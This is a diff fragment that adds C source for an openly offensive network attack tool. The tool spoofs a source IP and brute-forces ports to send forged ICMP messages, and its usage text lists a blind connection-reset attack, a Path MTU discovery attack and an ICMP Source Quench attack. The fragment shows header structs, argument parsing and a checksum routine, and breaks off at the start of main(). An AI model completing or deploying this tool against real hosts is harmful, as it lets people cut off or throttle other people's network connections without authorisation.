@@ -1,0 +1,144 @@
+/* Unique identifier */
+       unsigned short ip_offset;       /* Fragment offset field */
+       unsigned char  ip_ttl;          /* Time to live */
+       unsigned char  ip_protocol;     /* Protocol */
+       unsigned short ip_checksum;     /* IP checksum */
+       unsigned int   ip_srcaddr;      /* Source address */
+       unsigned int   ip_destaddr;     /* Destination address */
+} IP_HDR, *PIP_HDR;
+
+/* Define the ICMP header */
+/* Destination Unreachable Message */
+typedef struct icmp_hdr {
+       unsigned char  type;            /* Type */
+       unsigned char  code;            /* Code */
+       unsigned short checksum;        /* Checksum */
+       unsigned long  unused;          /* Unused */
+} ICMP_HDR, *PICMP_HDR;
+
+/* 64 bits of Original Data Datagram (TCP header) */
+char msg[] =
+"\x00\x50"                              /* Source port */
+"\x00\x50"                              /* Destination port */
+"\x23\x48\x4f\x44";
+
+/* globals */
+unsigned long   dwToIP,                 /* IP to send to */
+               dwFromIP;               /* IP to send from (spoof) */
+unsigned short  iToPort,                /* Port to send to */
+               iFromPort;              /* Port to send from (spoof) */
+unsigned long   dwCount;                /* Number of times to send */
+unsigned long   Attack;
+
+void
+usage(char *progname) {
+       printf("Usage:\n\n");
+       printf("%s <-fi:SRC-IP> <-ti:VICTIM-IP> <-fi:SRC-PORT> [-tp:int] [-a:int] [-n:int]\n\n", progname);
+       printf("       -fi:IP    From (sender) IP address\n");
+       printf("       -ti:IP    To (target) IP address\n");
+       printf("       -fp:int   Target open TCP port number\n");
+       printf("                 (for example - 21, 25, 80)\n");
+       printf("       -tp:int   Inicial value for bruteforce (sender) TCP port number\n");
+       printf("                 (default: 0 = range of ports 0-65535)\n");
+       printf("       -n:int    Number of packets\n\n");
+       printf("       -a:int    ICMP attacks:\n");
+       printf("                    1 - Blind connection-reset attack\n");
+       printf("                        (ICMP protocol unreachable)\n");
+       printf("                    2 - Path MTU discovery attack\n");
+       printf("                        (slow down the transmission rate)\n");
+       printf("                    3 - ICMP Source Quench attack\n");
+       exit(1);
+}
+
+void
+ValidateArgs(int argc, char **argv)
+{
+       int i;
+
+       iToPort = 0;
+       iFromPort = DEFAULT_PORT;
+       dwToIP = inet_addr(DEFAULT_IP);
+       dwFromIP = inet_addr(DEFAULT_IP);
+       dwCount = DEFAULT_COUNT;
+       Attack = 1;
+
+       for (i = 1; i < argc; i++) {
+               if ((argv[i][0] == '-') || (argv[i][0] == '/')) {
+                       switch (tolower(argv[i][1])) {
+                               case 'f':
+                                       switch (tolower(argv[i][2])) {
+                                               case 'p':
+                                                       if (strlen(argv[i]) > 4)
+                                                       iFromPort = atoi(&argv[i][4]);
+                                                       break;
+                                               case 'i':
+                                                       if (strlen(argv[i]) > 4)
+                                                       dwFromIP = inet_addr(&argv[i][4]);
+                                                       break;
+                                               default:
+                                                       usage(argv[0]);
+                                                       break;
+                                       }
+                                       break;
+                               case 't':
+                                       switch (tolower(argv[i][2])) {
+                                               case 'p':
+                                                       if (strlen(argv[i]) > 4)
+                                                       iToPort = atoi(&argv[i][4]);
+                                                       break;
+                                               case 'i':
+                                                       if (strlen(argv[i]) > 4)
+                                                       dwToIP = inet_addr(&argv[i][4]);
+                                                       break;
+                                               default:
+                                                       usage(argv[0]);
+                                                       break;
+                                       }
+                                       break;
+                               case 'n':
+                                       if (strlen(argv[i]) > 3)
+                                       dwCount = atol(&argv[i][3]);
+                                       break;
+                               case 'a':
+                                       if (strlen(argv[i]) > 3)
+                                       Attack = atol(&argv[i][3]);
+                                       if ((Attack > 3) || (Attack < 1))
+                                       usage(argv[0]);
+                                       break;
+                               default:
+                                       usage(argv[0]);
+                                       break;
+                       }
+               }
+       }
+       return;
+}
+
+/*    This function calculates the 16-bit one's complement sum */
+/*    for the supplied buffer */
+unsigned short
+checksum(unsigned short *buffer, int size)
+{
+       unsigned long cksum = 0;
+
+       while (size > 1) {
+               cksum += *buffer++;
+               size  -= sizeof(unsigned short);
+       }
+       if (size) {
+               cksum += *(unsigned char *)buffer;
+       }
+       cksum = (cksum >> 16) + (cksum & 0xffff);
+       cksum += (cksum >>16);
+
+       return (unsigned short)(~cksum);
+}
+
+int
+main(int argc, char **argv)
+{
+
+#ifdef _WIN32
+       WSADATA         wsd;
+#endif
+       int       
